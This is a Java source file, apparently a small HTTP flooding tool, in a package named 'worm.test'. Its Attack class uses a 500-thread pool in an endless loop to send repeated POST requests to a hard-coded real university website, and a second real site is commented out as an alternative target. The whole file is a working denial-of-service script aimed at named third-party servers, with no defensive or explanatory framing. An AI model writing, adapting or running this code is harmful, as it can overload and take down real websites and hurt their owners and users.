package com.mjw.worm.test;

import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

import org.apache.commons.httpclient.HttpClient;
import org.apache.commons.httpclient.methods.PostMethod;

class Test2 {
	// 第一种方法
	// 这种方法是用apache提供的包,简单方便
	// 但是要用到以下包:commons‐codec‐1.4.jar
	// commons‐httpclient‐3.1.jar
	// commons‐logging‐1.0.4.jar
	public static String createhttpClient(String url, String param) {
		HttpClient client = new HttpClient();
		String response = null;
		String keyword = null;
		PostMethod postMethod = new PostMethod(url);
		// try {
		// if (param != null)
		// keyword = new String(param.getBytes("gb2312"), "ISO‐8859‐1");
		// } catch (UnsupportedEncodingException e1) {
		// // TODO Auto‐generated catch block
		// e1.printStackTrace();
		// }
		// NameValuePair[] data = { new NameValuePair("keyword", keyword) };
		// // 将表单的值放入postMethod中
		// postMethod.setRequestBody(data);
		// 以上部分是带参数抓取,我自己把它注销了．大家可以把注销消掉研究下
		try {
			int statusCode = client.executeMethod(postMethod);
			// response = postMethod.getResponseBodyAsString();
			response = new String(postMethod.getResponseBodyAsString()
					.getBytes("ISO-8859-1"), "UTF-8");
			// 这里要注意下 gb2312要和你抓取网页的编码要一样
			String p = response.replaceAll("//&[a‐zA‐Z]{1,10};", "")
					.replaceAll("<[^>]*>", ""); // 去掉网页中带有html语言的标签
			//System.out.println(response);
		} catch (Exception e) {
			e.printStackTrace();
		}
		return response;
	}

}

class Attack implements Runnable {
	private String url;
	private int sum;

	public Attack(String url, int sum) {
		this.url = url;
		this.sum = sum;
	}

	@Override
	public void run() {
		// TODO Auto-generated method stub
		for (int i = 0; i < 10; i++) {
			Test2.createhttpClient(url, null);
			System.err.println(Thread.currentThread().getName() + ": 第" + sum
					+ "线程调用， 第" + i + "次县城内循环。");
		}
	}
}

public class Test {
	private static int sum = 0;

	public static void main(String[] args) {
		ExecutorService fixedThreadPool = Executors.newFixedThreadPool(500);
		while (true) {
			try {
				Thread.sleep(100);
			} catch (InterruptedException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}
			sum = sum + 1;
			fixedThreadPool.execute(new Thread(new Attack(
					"http://www.zzti.edu.cn", sum)));
//			fixedThreadPool.execute(new Thread(new Attack(
//					"http://www.9dm.cn", sum)));
		}
	}
}